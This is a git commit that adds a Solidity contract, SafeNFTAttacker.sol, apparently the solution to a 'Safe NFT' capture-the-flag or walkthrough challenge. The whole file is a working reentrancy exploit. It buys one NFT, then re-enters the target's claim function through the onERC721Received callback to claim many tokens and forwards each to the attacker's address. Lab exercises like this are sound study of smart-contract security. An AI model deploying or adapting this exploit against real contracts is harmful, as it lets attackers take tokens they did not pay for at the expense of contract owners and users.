12451c61617689268ebdab13c34f2ed5f15ced95
CristianRicharte6 <102038261+CristianRicharte6@users.noreply.github.com>
2023-02-23 18:05:33 +0100

    Create SafeNFTAttacker.sol

---
+++ Safe NFT Walkthrough/SafeNFTAttacker.sol
@@ -0,0 +1,44 @@
+contract SafeNFTAttacker is IERC721Receiver {
+  uint private claimed;
+  uint private count;
+  address private owner;
+  safeNFT private target;
+
+  constructor(uint count_, address targetAddr_) {
+    target = safeNFT(targetAddr_);
+    count = count_;
+    owner = msg.sender;
+  }
+
+  // initiate the pwnage by purchasing a single NFT
+  // we will re-enter later via onERC721Received
+  function pwn() external payable {
+    target.buyNFT{value: msg.value}();
+    target.claim();
+  }
+
+  function claimNext() internal {
+    // keep record of the current claim
+    claimed++;
+    // if we want to keep on claiming, continue re-entering
+    // stop if you think they've had enough :)
+    if (claimed != count) {
+      target.claim();
+    }
+  }
+
+  function onERC721Received(
+    address /*operator*/,
+    address /*from*/,
+    uint256 tokenId,
+    bytes calldata /*data*/
+  ) external override returns (bytes4) {
+    // forward the claimed NFT to yourself
+    target.transferFrom(address(this), owner, tokenId);
+
+    // re-enter
+    claimNext();
+
+    return IERC721Receiver.onERC721Received.selector;
+  }
+}
